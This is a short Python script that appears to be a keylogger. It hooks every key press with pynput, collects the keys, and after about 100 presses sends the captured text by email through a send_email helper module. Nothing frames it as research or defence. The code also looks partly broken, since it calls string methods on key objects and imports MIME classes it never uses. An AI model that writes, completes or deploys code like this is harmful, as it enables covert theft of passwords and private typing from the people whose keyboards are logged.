from pynput.keyboard import Key, Listener
from email.mime.application import MIMEApplication
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
import send_email

count = 0
keys = []
#function
def on_press(key):
    global keys, count

    print(key)  
    keys.append(key)  # append each key to empty list
    count += 1  # increase keys count by 1
    if count > 100:
        count = 0
        email(keys)

def email(keys): 
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " "
        elif key.find("key")>0:
            k = ""
        message += k
    print(message)
    send_email.sendEmail(message)        

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as l:  # implement three function together
    l.join()
